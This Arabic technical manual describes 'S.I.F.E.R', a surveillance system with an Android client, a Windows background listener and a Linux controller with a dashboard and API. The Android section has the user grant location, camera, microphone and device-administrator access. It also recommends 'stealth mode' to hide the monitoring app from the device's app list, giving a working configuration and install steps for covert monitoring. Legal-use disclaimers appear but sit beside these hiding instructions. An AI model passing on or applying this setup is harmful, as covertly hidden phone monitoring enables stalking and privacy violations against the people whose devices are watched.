دليل S.I.F.E.R التقني

ملاحظة: S.I.F.E.R هو نظام مراقبة متقدم مصمم للمحترفين في مجال الأمن السيبراني.

ما هو S.I.F.E.R؟

S.I.F.E.R (Surveillance Interface For Enhanced Response) هو نظام مراقبة سيبراني هجومي/دفاعي متطور، يتيح لك مراقبة جميع أجهزتك (Android, PC, IoT) بشكل مستمر ومتزامن.

الهيكل العام للنظام

📱 Android Client

تطبيق مراقبة يركب على أجهزة Android ويرسل البيانات باستمرار

💻 Windows Listener

خدمة خلفية تراقب أنظمة Windows وتحلل الأنشطة المشبوهة

🖥️ Mini PC Controller

مركز التحكم الرئيسي الذي يجمع ويحلل البيانات من جميع المصادر

متطلبات النظام

المكون المتطلبات الدنيا الموصى به
Controller PC 8GB RAM, Quad-Core CPU 16GB RAM, 8-Core CPU
Android Device Android 7.0+ Android 10.0+
Windows PC Windows 10 Windows 11
تحذير: استخدم النظام بمسؤولية وفقط على الأجهزة التي تملكها أو لديك إذن قانوني لمراقبتها.

Android Client

التثبيت على Android

Android Client هو العنصر الأساسي لمراقبة الهواتف الذكية والأجهزة اللوحية.

خطوات التثبيت

  1. تمكين مصادر غير معروفة

    اذهب إلى الإعدادات > الأمان > مصادر غير معروفة وقم بتفعيلها

  2. تحميل وتثبيت APK

    Terminal Commands
    adb install sifer_android_client.apk
    # أو قم بالتثبيت يدوياً من خلال مدير الملفات

  3. منح الصلاحيات

    امنح التطبيق جميع الصلاحيات المطلوبة للمراقبة الشاملة

الصلاحيات المطلوبة

الصلاحية الغرض مستوى الأهمية
Location Access تتبع الموقع الجغرافي حرج
Camera/Microphone التسجيل والمراقبة حرج
Device Administrator التحكم في الجهاز حرج
Network Access إرسال البيانات حرج

الإعدادات

config/android_client.json
{
  "server_ip": "192.168.1.100",
  "server_port": 8443,
  "reporting_interval": 30,
  "location_tracking": true,
  "stealth_mode": true,
  "encryption_key": "your_secure_key_here"
}
نصيحة: فعّل الوضع الخفي (Stealth Mode) لإخفاء التطبيق من قائمة التطبيقات.

Windows Listener

نظرة عامة

Windows Listener هو خدمة تعمل في الخلفية لمراقبة أنظمة Windows بشكل شامل.

التثبيت والإعداد

  1. تشغيل كمدير

    انقر بالزر الأيمن على sifer_windows.exe واختر "تشغيل كمدير"

  2. تثبيت الخدمة

    Command Prompt (Admin)
    sifer_windows.exe --install-service
    net start "SIFER Windows Listener"
    sc config "SIFER Windows Listener" start= auto

  3. تحقق من التشغيل

    PowerShell
    Get-Service "SIFER Windows Listener"
    Get-Process sifer_windows -ErrorAction SilentlyContinue

Mini PC Controller

مركز التحكم الرئيسي

Controller هو العقل المدبر للنظام، يجمع ويحلل البيانات من جميع المصادر.

متطلبات الأجهزة

المكون الحد الأدنى الموصى به
المعالج Intel i5 / AMD Ryzen 5 Intel i7 / AMD Ryzen 7
الذاكرة 8GB RAM 16GB+ RAM
التخزين 256GB SSD 512GB+ NVMe SSD
الشبكة Gigabit Ethernet WiFi 6 + Gigabit

التثبيت والإعداد الأولي

  1. تثبيت Controller

    Linux Terminal
    sudo chmod +x sifer_controller.run
    sudo ./sifer_controller.run --install
    sudo systemctl enable sifer-controller
    sudo systemctl start sifer-controller

  2. إعداد قاعدة البيانات

    Database Setup
    sudo -u postgres psql
    CREATE DATABASE sifer_db;
    CREATE USER sifer_user WITH PASSWORD 'secure_password';
    GRANT ALL PRIVILEGES ON DATABASE sifer_db TO sifer_user;

  3. تهيئة الشبكة

    قم بإعداد البورتات والجدار الناري للسماح بالاتصالات

    Firewall Configuration
    sudo ufw allow 8443/tcp # Main API Port
    sudo ufw allow 9443/tcp # Dashboard Port
    sudo ufw allow 7443/tcp # Data Collection Port
    sudo ufw reload

واجهة الويب

يمكن الوصول إلى لوحة التحكم عبر المتصفح:

Web Interface
https://your-controller-ip:9443
Username: admin
Password: [generated during installation]
نصيحة: استخدم IP ثابت للـ Controller لتجنب مشاكل الاتصال.

الإعدادات المتقدمة

  geo_tracking: true

إعدادات التنبيهات

نوع التنبيه المستوى الإجراء
محاولة اختراق حرج إيقاف الجهاز + إشعار فوري
برمجية خبيثة حرج عزل الجهاز + تنظيف
تغيير موقع مشبوه متوسط إشعار + تسجيل
استخدام مرتفع للموارد منخفض تسجيل فقط

إعداد التشفير

لضمان أمان البيانات المنقولة:

Generate SSL Certificates
# إنتاج شهادات SSL
openssl genrsa -out server.key 2048
openssl req -new -x509 -key server.key -out server.crt -days 365

# نقل الشهادات
sudo cp server.crt /etc/sifer/certs/
sudo cp server.key /etc/sifer/certs/
sudo chmod 600 /etc/sifer/certs/*
تحذير: لا تشارك مفاتيح التشفير أو ملفات الإعداد مع أطراف خارجية.

مرجع API

نظرة عامة

S.I.F.E.R يوفر RESTful API شامل للتكامل مع الأنظمة الخارجية.

Authentication

POST /api/v1/auth/login
curl -X POST https://controller-ip:8443/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": "your_password",
    "device_id": "unique_device_id"
  }'

Device Management

Endpoint Method الوصف
/api/v1/devices GET قائمة جميع الأجهزة
/api/v1/devices/{id} GET تفاصيل جهاز محدد
/api/v1/devices/{id}/status PUT تحديث حالة الجهاز
/api/v1/devices/{id}/commands POST إرسال أوامر للجهاز

حل المشاكل الشائعة

مشاكل الاتصال

مشكلة: الأجهزة لا تتصل بـ Controller

الحلول المحتملة:

  1. فحص الشبكة

    Network Diagnostics
    ping controller-ip
    telnet controller-ip 8443
    nmap -p 8443 controller-ip

  2. فحص Firewall

    تأكد من أن البورتات مفتوحة في جدار الحماية

  3. فحص شهادات SSL

    SSL Certificate Check
    openssl s_client -connect controller-ip:8443
    curl -v https://controller-ip:8443/api/v1/health

مشاكل الأداء

مشكلة: النظام بطيء أو يستهلك موارد كثيرة

تحسين الأداء:

  • زيادة ذاكرة الـ Controller
  • تقليل فترة إرسال البيانات
  • تنظيف قاعدة البيانات القديمة
  • استخدام SSD بدلاً من HDD
Database Cleanup
# حذف البيانات القديمة (أكثر من 30 يوم)
sudo -u postgres psql sifer_db
DELETE FROM device_logs WHERE created_at < NOW() - INTERVAL '30 days';
VACUUM ANALYZE;

الأمان والحماية

أمان البيانات

S.I.F.E.R يستخدم أحدث تقنيات التشفير والحماية:

🔐 تشفير AES-256

جميع البيانات مشفرة باستخدام معيار AES-256

🛡️ SSL/TLS

اتصالات آمنة مع شهادات SSL محدثة

🔑 مصادقة متعددة المستويات

نظام مصادقة قوي مع tokens منتهية الصلاحية

🚫 حماية من البروت فورس

حماية ضد هجمات التجربة والخطأ

الممارسات الآمنة

نصائح الأمان:
  • غيّر كلمات المرور الافتراضية فوراً
  • استخدم شبكة منعزلة للـ Controller
  • فعّل النسخ الاحتياطي المشفر
  • راجع سجلات الوصول بانتظام
  • حدّث النظام باستمرار

إعدادات الأمان المتقدمة

security_config.yaml
security:
  # كلمة مرور قوية للمدير
  admin_password_policy:
    min_length: 12
    require_uppercase: true
    require_numbers: true
    require_symbols: true

  # حماية من البروت فورس
  brute_force_protection:
    max_attempts: 3
    lockout_duration: 900 # 15 minutes
    ban_duration: 3600 # 1 hour

  # تدوير المفاتيح
  key_rotation:
    enabled: true
    interval_days: 30
    backup_old_keys: true

مراقبة الأمان

النظام يراقب نفسه باستمرار ويكشف:

  • محاولات الوصول غير المصرح بها
  • تغييرات في ملفات النظام المهمة
  • أنشطة مشبوهة في قاعدة البيانات
  • محاولات تعديل إعدادات الأمان

النسخ الاحتياطي الآمن

Encrypted Backup Script
#!/bin/bash
# نسخة احتياطية مشفرة لقاعدة البيانات
BACKUP_DATE=$(date +%Y%m%d_%H%M%S)
pg_dump sifer_db | gzip | gpg --cipher-algo AES256 --compress-algo 1 --symmetric --output /backup/sifer_backup_$BACKUP_DATE.sql.gz.gpg

# نسخة احتياطية لملفات الإعداد
tar -czf - /etc/sifer | gpg --cipher-algo AES256 --symmetric --output /backup/sifer_config_$BACKUP_DATE.tar.gz.gpg
تحذير هام: S.I.F.E.R أداة قوية. استخدمها بمسؤولية ووفقاً للقوانين المحلية فقط.

الامتثال القانوني

تأكد من الامتثال للقوانين المحلية عند استخدام النظام:

  • لا تراقب أجهزة لا تملكها
  • احترم قوانين الخصوصية المحلية
  • احصل على إذن كتابي عند مراقبة أجهزة الموظفين
  • قم بتشفير وحماية البيانات المجمعة
  • اتّبع سياسات الاحتفاظ بالبيانات
